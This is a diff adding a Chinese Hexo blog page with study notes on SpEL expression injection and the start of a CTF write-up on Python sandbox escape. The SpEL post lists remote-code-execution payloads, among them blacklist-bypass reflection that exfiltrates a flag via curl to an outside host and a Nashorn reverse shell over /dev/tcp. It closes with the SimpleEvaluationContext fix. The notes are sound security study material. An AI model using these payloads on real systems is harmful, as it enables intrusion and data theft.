@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/9/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-SpEL表达式注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/10/01/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2021-10-01T11:06:19.627Z" itemprop="datePublished">2021-10-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/10/01/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SpEL表达式注入漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SpEL表达式注入漏洞"><a href="#SpEL表达式注入漏洞" class="headerlink" title="SpEL表达式注入漏洞"></a>SpEL表达式注入漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Expression Language（简称SpEL）。SpEL引擎作为Spring 组合里的表达式解析的基础 ，但它不直接依赖于Spring,可独立使用。 </p>
+<h2 id="SpEL测试代码"><a href="#SpEL测试代码" class="headerlink" title="SpEL测试代码"></a>SpEL测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;&#x27;Hello World&#x27;&quot;</span>);</span><br><span class="line"><span class="comment">//Expression randomPhrase = parser.parseExpression(&quot;123&quot;,new TemplateParserContext());</span></span><br><span class="line">String message = (String) exp.getValue();</span><br><span class="line"><span class="comment">//String message = exp.getValue(String.class);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p> 上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。 </p>
+<p><code>TemplateParserContext</code>添加了 <strong>表达式模板</strong> 解析器</p>
+<h2 id="SpEL语法"><a href="#SpEL语法" class="headerlink" title="SpEL语法"></a>SpEL语法</h2><h3 id="使用SpEL接口进行表达式求值"><a href="#使用SpEL接口进行表达式求值" class="headerlink" title="使用SpEL接口进行表达式求值"></a>使用SpEL接口进行表达式求值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;&#x27;Hello World&#x27;&quot;</span>);</span><br><span class="line">String message = (String) exp.getValue();</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="方法调用，访问属性，调用构造函数"><a href="#方法调用，访问属性，调用构造函数" class="headerlink" title="方法调用，访问属性，调用构造函数"></a>方法调用，访问属性，调用构造函数</h3><p>这些都和平时的java没什么不同,demo:</p>
+<p>访问属性：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;&#x27;123&#x27;.bytes&quot;</span>);</span><br><span class="line">System.out.println((Object)exp.getValue());</span><br></pre></td></tr></table></figure>
+
+<p>方法调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;&#x27;123&#x27;.length()&quot;</span>);</span><br><span class="line">System.out.println((Object)exp.getValue());</span><br></pre></td></tr></table></figure>
+
+<p>调用构造函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;new String(1234)&quot;</span>);</span><br><span class="line">System.out.println((Object)exp.getValue());</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="访问根对象属性方法等"><a href="#访问根对象属性方法等" class="headerlink" title="访问根对象属性方法等"></a>访问根对象属性方法等</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">    	Expression exp = parser.parseExpression(<span class="string">&quot;fucker+tou()&quot;</span>);</span><br><span class="line">    	System.out.println((Object)exp.getValue(<span class="keyword">new</span> Object()&#123;</span><br><span class="line">    	    <span class="keyword">public</span> String fucker=<span class="string">&quot;fucker&quot;</span>;</span><br><span class="line">    	    <span class="function"><span class="keyword">public</span> String <span class="title">tou</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	        <span class="keyword">return</span> <span class="string">&quot;toutoutou&quot;</span>;</span><br><span class="line">    	    &#125;;</span><br><span class="line">    	&#125;));</span><br></pre></td></tr></table></figure>
+
+<p>结果：<code>fuckertoutoutou</code></p>
+<h3 id="传递根对象-root"><a href="#传递根对象-root" class="headerlink" title="传递根对象/#root"></a>传递根对象/#root</h3><h4 id="StandardEvaluationContext"><a href="#StandardEvaluationContext" class="headerlink" title="StandardEvaluationContext"></a>StandardEvaluationContext</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create and set a calendar</span></span><br><span class="line">GregorianCalendar c = <span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">c.set(<span class="number">1856</span>, <span class="number">7</span>, <span class="number">9</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// The constructor arguments are name, birthday, and nationality.</span></span><br><span class="line">Inventor tesla = <span class="keyword">new</span> Inventor(<span class="string">&quot;Nikola Tesla&quot;</span>, c.getTime(), <span class="string">&quot;Serbian&quot;</span>);</span><br><span class="line"></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext(tesla);</span><br><span class="line">String name = (String) exp.getValue(context);</span><br></pre></td></tr></table></figure>
+
+<p>这里的root object 是 tesla,<code>parser.parseExpression(&quot;name&quot;);</code>会返回tesla的name属性</p>
+<h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue"></a>getValue</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create and set a calendar</span></span><br><span class="line">GregorianCalendar c = <span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">c.set(<span class="number">1856</span>, <span class="number">7</span>, <span class="number">9</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// The constructor arguments are name, birthday, and nationality.</span></span><br><span class="line">Inventor tesla = <span class="keyword">new</span> Inventor(<span class="string">&quot;Nikola Tesla&quot;</span>, c.getTime(), <span class="string">&quot;Serbian&quot;</span>);</span><br><span class="line"></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">String name = (String) exp.getValue(tesla);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="数组和列表和字典-取值"><a href="#数组和列表和字典-取值" class="headerlink" title="数组和列表和字典 取值"></a>数组和列表和字典 取值</h3><p> 属性名的第一个字母可以是大小写敏感的。数组和列表的内容可以使用方括号来标记 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Inventions Array</span></span><br><span class="line">StandardEvaluationContext teslaContext = <span class="keyword">new</span> StandardEvaluationContext(tesla);</span><br><span class="line"></span><br><span class="line"><span class="comment">// evaluates to &quot;Induction motor&quot;</span></span><br><span class="line">String invention = parser.parseExpression(<span class="string">&quot;inventions[3]&quot;</span>).getValue(</span><br><span class="line">		teslaContext, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Members List</span></span><br><span class="line">StandardEvaluationContext societyContext = <span class="keyword">new</span> StandardEvaluationContext(ieee);</span><br><span class="line"></span><br><span class="line"><span class="comment">// evaluates to &quot;Nikola Tesla&quot;</span></span><br><span class="line">String name = parser.parseExpression(<span class="string">&quot;Members[0].Name&quot;</span>).getValue(</span><br><span class="line">		societyContext, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// List and Array navigation</span></span><br><span class="line"><span class="comment">// evaluates to &quot;Wireless communication&quot;</span></span><br><span class="line">String invention = parser.parseExpression(<span class="string">&quot;Members[0].Inventions[6]&quot;</span>).getValue(</span><br><span class="line">		societyContext, String.class);</span><br></pre></td></tr></table></figure>
+
+<p> Maps的值由方括号内指定字符串的Key来标识引用。在下面这个例子中，因为Officers map的Key是string类型，我们可以用过字符串常量指定。 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Officer&#x27;s Dictionary</span></span><br><span class="line"></span><br><span class="line">Inventor pupin = parser.parseExpression(<span class="string">&quot;Officers[&#x27;president&#x27;]&quot;</span>).getValue(</span><br><span class="line">		societyContext, Inventor.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// evaluates to &quot;Idvor&quot;</span></span><br><span class="line">String city = parser.parseExpression(<span class="string">&quot;Officers[&#x27;president&#x27;].PlaceOfBirth.City&quot;</span>).getValue(</span><br><span class="line">		societyContext, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// setting values</span></span><br><span class="line">parser.parseExpression(<span class="string">&quot;Officers[&#x27;advisors&#x27;][0].PlaceOfBirth.Country&quot;</span>).setValue(</span><br><span class="line">		societyContext, <span class="string">&quot;Croatia&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="声明数组列表和字典"><a href="#声明数组列表和字典" class="headerlink" title="声明数组列表和字典"></a>声明数组列表和字典</h3><p>列表：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evaluates to a Java list containing the four numbers</span></span><br><span class="line">List numbers = (List) parser.parseExpression(<span class="string">&quot;&#123;1,2,3,4&#125;&quot;</span>).getValue(context);</span><br><span class="line"></span><br><span class="line">List listOfLists = (List) parser.parseExpression(<span class="string">&quot;&#123;&#123;&#x27;a&#x27;,&#x27;b&#x27;&#125;,&#123;&#x27;x&#x27;,&#x27;y&#x27;&#125;&#125;&quot;</span>).getValue(context);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>字典：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evaluates to a Java map containing the two entries</span></span><br><span class="line">Map inventorInfo = (Map) parser.parseExpression(<span class="string">&quot;&#123;name:&#x27;Nikola&#x27;,dob:&#x27;10-July-1856&#x27;&#125;&quot;</span>).getValue(context);</span><br><span class="line"></span><br><span class="line">Map mapOfMaps = (Map) parser.parseExpression(<span class="string">&quot;&#123;name:&#123;first:&#x27;Nikola&#x27;,last:&#x27;Tesla&#x27;&#125;,dob:&#123;day:10,month:&#x27;July&#x27;,year:1856&#125;&#125;&quot;</span>).getValue(context);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>数组：</p>
+<p> 数组可以使用类似于Java的语法创建，创建时可以事先指定数组的容量大小、这个是可选的。 在创建多维数组时还不支持事先指定初始化的值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] numbers1 = (<span class="keyword">int</span>[]) parser.parseExpression(<span class="string">&quot;new int[4]&quot;</span>).getValue(context);</span><br></pre></td></tr></table></figure>
+
+<h3 id="T操作符"><a href="#T操作符" class="headerlink" title="T操作符"></a>T操作符</h3><p><code>T()</code>运算符会调用类作用域的方法和常量。 </p>
+<p> T操作符是一个特殊的操作符、可以同于指定java.lang.Class的实例（类型）。静态方法也可以通过这个操作符调用。  **T()引用java.lang包里面的类型不需要限定包全名，但是其他类型的引用必须要。 **</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class dateClass = parser.parseExpression(<span class="string">&quot;T(java.util.Date)&quot;</span>).getValue(Class.class);</span><br><span class="line"></span><br><span class="line">Class stringClass = parser.parseExpression(<span class="string">&quot;T(String)&quot;</span>).getValue(Class.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">boolean</span> trueValue = parser.parseExpression(</span><br><span class="line">		<span class="string">&quot;T(java.math.RoundingMode).CEILING &gt;= T(java.math.RoundingMode).FLOOR&quot;</span>)</span><br><span class="line">		.getValue(Boolean.class);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="表达式模板"><a href="#表达式模板" class="headerlink" title="表达式模板"></a>表达式模板</h3><p> 表达式模板运行在一段文本中混合包含一个或多个求值表达式模块。各个求值块都通过可被自定义的前后缀字符分隔，一个通用的选择是使用#{ }作为分隔符。 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String randomPhrase = parser.parseExpression(</span><br><span class="line">		<span class="string">&quot;random number is #&#123;T(java.lang.Math).random()&#125;&quot;</span>,</span><br><span class="line">		<span class="keyword">new</span> TemplateParserContext()).getValue(String.class);</span><br></pre></td></tr></table></figure>
+
+<p>结果：<code>random number is xxxx</code></p>
+<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p> 表达式中的变量可以通过语法#变量名使用。变量可以在StandardEvaluationContext中通过方法setVariable设置。 </p>
+<h4 id="this和root变量"><a href="#this和root变量" class="headerlink" title="this和root变量"></a>this和root变量</h4><p> #this变量永远指向当前表达式正在求值的对象（这时不需要限定全名）。变量#root总是指向根上下文对象。#this在表达式不同部分解析过程中可能会改变，但是#root总是指向根 </p>
+<h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>T()和new一个类时 除了java.lang下的类，其他类都要需要需要限定包全名</p>
+<h2 id="SpEL导致的任意命令执行"><a href="#SpEL导致的任意命令执行" class="headerlink" title="SpEL导致的任意命令执行"></a>SpEL导致的任意命令执行</h2><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(&quot;nslookup a.com&quot;)</span><br><span class="line">T(Thread).sleep(10000)</span><br><span class="line">#this.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;nslookup a.com&#x27;)</span><br><span class="line">new java.lang.ProcessBuilder(&#123;&#x27;nslookup a.com&#x27;&#125;).start()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用反射构造绕过黑名单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr &#x27;\n&#x27; &#x27;-&#x27;`&quot;&#125;)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用ScriptEngineManager构造绕过黑名单</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(javax.script.ScriptEngineManager).newInstance()</span><br><span class="line">    .getEngineByName(<span class="string">&quot;nashorn&quot;</span>)</span><br><span class="line">        .eval(<span class="string">&quot;s=[3];s[0]=&#x27;/bin/bash&#x27;;s[1]=&#x27;-c&#x27;;s[2]=&#x27;ex&quot;</span>+<span class="string">&quot;ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#x27;;java.la&quot;</span>+<span class="string">&quot;ng.Run&quot;</span>+<span class="string">&quot;time.getRu&quot;</span>+<span class="string">&quot;ntime().ex&quot;</span>+<span class="string">&quot;ec(s);&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;[&#x27;class&#x27;].forName(&#x27;java.lang.Runtime&#x27;).getDeclaredMethods()[15]</span><br><span class="line">    .invoke(&#x27;&#x27;[&#x27;class&#x27;].forName(&#x27;java.lang.Runtime&#x27;).getDeclaredMethods()[7]</span><br><span class="line">        .invoke(null),&#x27;curl 172.17.0.1:9898&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p> 除此以外当执行的系统命令被过滤或者被URL编码掉时我们可以通过<code>String</code>类动态生成字符<br>如要执行的命令为<code>open /Applications/Calculator.app</code>我们可以采用<code>new java.lang.String(new byte[]&#123;,,...&#125;)</code>或者<code>concat(T(java.lang.Character).toString())</code>嵌套来绕过 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,&#123;&#125;).eval(&#x27;whatever java code in one statement&#x27;).toString()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><h4 id="new被过滤"><a href="#new被过滤" class="headerlink" title="new被过滤"></a>new被过滤</h4><p>可以用NEW</p>
+<h3 id="一些相关的ctf题目"><a href="#一些相关的ctf题目" class="headerlink" title="一些相关的ctf题目"></a>一些相关的ctf题目</h3><h4 id="de1ctf2020-cal"><a href="#de1ctf2020-cal" class="headerlink" title="de1ctf2020 cal"></a>de1ctf2020 cal</h4><h3 id="SpEL提供的两个EvaluationContext的区别"><a href="#SpEL提供的两个EvaluationContext的区别" class="headerlink" title="SpEL提供的两个EvaluationContext的区别"></a>SpEL提供的两个<code>EvaluationContext</code>的区别</h3><p>SpEL提供的两个<code>EvaluationContext</code>的区别。<br>（EvaluationContext评估表达式以解析属性，方法或字段并帮助执行类型转换时使用该接口。有两个开箱即用的实现。）</p>
+<ul>
+<li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li>
+<li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
+</ul>
+<p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。</p>
+<p>所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a target="_blank" rel="noopener" href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a> </p>
+<p> <a target="_blank" rel="noopener" href="http://ifeve.com/spring-6-spel/">http://ifeve.com/spring-6-spel/</a>  文档</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/10/01/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cku89gxtq0025wvos1mbb7vq1" data-title="SpEL表达式注入漏洞" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019xman个人排位赛wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/10/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" class="article-date">
+  <time class="dt-published" datetime="2021-10-01T11:06:19.623Z" itemprop="datePublished">2021-10-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/10/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="escape"><a href="#escape" class="headerlink" title="escape"></a>escape</h2><p>收获:了解了python沙箱逃逸这种类型</p>
+<p>getattr:对沙箱逃逸有很大作用</p>
+<p>list(s)获得字符集,可以用来绕过引号限制</p>
+<p>试了一下system</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banned=  [<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;reload&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;const&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;translate&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;frame&#x27;</span>, <span class="string">&#x27;back&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>发现引号和点都被过滤了,不过提示说</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">   os.system(<span class="string">&quot;echo hello&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>说明是可以通过调用system来完成,接下来就是想办法得到system函数了</p>
+<p>而引号被过滤可以用字符串s里的值来绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#考虑这样来</span></span><br><span class="line">a=<span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">a(<span class="string">&quot;命令&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_str</span>(<span class="params">string</span>):</span></span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result+=<span class="string">&#x27;table[&#x27;</span>+<span class="built_in">str</span>(table.index(i))+<span class="string">&#x27;]+&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> result[:-<span 